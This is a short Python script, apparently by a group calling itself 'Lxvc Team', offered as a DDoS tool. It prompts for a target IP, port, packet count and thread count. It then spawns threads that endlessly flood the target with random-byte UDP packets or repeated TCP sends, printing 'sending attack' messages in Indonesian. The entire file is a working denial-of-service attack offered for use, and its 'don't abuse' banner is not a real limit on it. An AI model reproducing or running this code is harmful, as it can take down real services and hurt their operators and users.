#!/usr/bin/env python3
#Tools by Lxvc Team
import random
import socket
import threading

print("------------------------------------------------------------")
print(" >>   Tools Created By Lxvc Team <<")
print(" >>   Discord : Unknow#1716      <<")
print(" >>   NOTE : DON'T ABUSE!!       <<")
print(" >>   #BUKAN HENGKER.            <<")
print("------------------------------------------------------------")
ip = str(input(" IP TARGET:"))
port = int(input(" PORT:"))
choice = str(input(" Gas DDoS? (y/n):"))
times = int(input(" Packets per one connection:"))
threads = int(input(" THREADS:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" LXVC TEAM | MENGIRIM SERANGAN!!!")
		except:
			print("[!] ERROR")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" LXVC TEAM | MENGIRIM SERANGAN!!!")
		except:
			s.close()
			print("[*] ERROR")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
